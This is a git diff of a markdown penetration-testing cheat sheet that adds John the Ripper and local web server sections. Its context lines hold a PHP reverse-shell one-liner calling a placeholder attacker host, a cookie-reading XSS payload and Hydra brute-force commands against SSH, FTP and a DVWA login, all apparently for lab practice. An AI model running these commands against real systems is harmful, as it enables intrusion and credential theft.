@@ -17,6 +17,8 @@
 - [netcat](#nc)
 - [Cross-Site Scripting](#xxs)
 - [Brute-force attack](#bruteforce)
+- [Password Cracking](#cracking)
+- [Simple Local Web Servers](#Localweb)
 
 
 # Enumeration
@@ -113,6 +115,9 @@ gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://192.168.54.84 -t 100
 - ## Mysql <a name="mysql"></a>
 - ```mysql -u root -p -h $ip```
 
+
+
+
 - ## Hydra <a name="hydra"></a>
 - ssh renu@127.0.0.1
 - if you don't know the password do brute force attack. replace username with ```renu``` and ipaddress with ```127.0.01```
@@ -129,8 +134,17 @@ gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://192.168.54.84 -t 100
   - to upload a file use ```put <filename>```
   - to download a file use ```get <filename>```
 
+
+
+
+
 - ## Cewl <a name="cewl"></a>
 - ```cewl -w passwords.txt http://192.168.245.48:1898/?q=node/1```
+
+
+
+
+
 
 - ## netcat <a name="nc"></a>
 ```php
@@ -138,6 +152,12 @@ gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://192.168.54.84 -t 100
  exec("/bin/bash -c 'bash -i >& /dev/tcp/attackerip/553 0>&1'");
 ?>
 ```
+
+
+
+
+
+
 
 
 - ## Cross-Site Scripting <a name="xxs"></a>
@@ -148,6 +168,14 @@ gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://192.168.54.84 -t 100
 ```js
 <img src="" onerror=alert(document.cookie)>
 ```
+
+
+
+
+
+
+
+
 
 - ## Brute-force attack <a name="bruteforce"></a>
 ### Hydra FTP Brute Force
@@ -172,3 +200,31 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 ssh
 ```
 hydra -l admin -P /usr/share/wordlists/rockyou.txt  127.0.0.1 http-post-form "/DVWA/vulnerabilities/brute/index.php:userField=^USER^:passwordField=^PASS^"
 ```
+
+
+
+
+
+- ## Password Cracking <a name="cracking"></a>
+### John The Ripper
+```
+john --format=descrypt --wordlist /usr/share/wordlists/rockyou.txt hash.txt
+```
+
+
+
+
+- ## Simple Local Web Servers <a name="Localweb"></a>
+
+```
+python -m SimpleHTTPServer 80
+```
+
+```
+python3 -m http.server
+```
+
+```
+php -S 0.0.0.0:80
+```
+
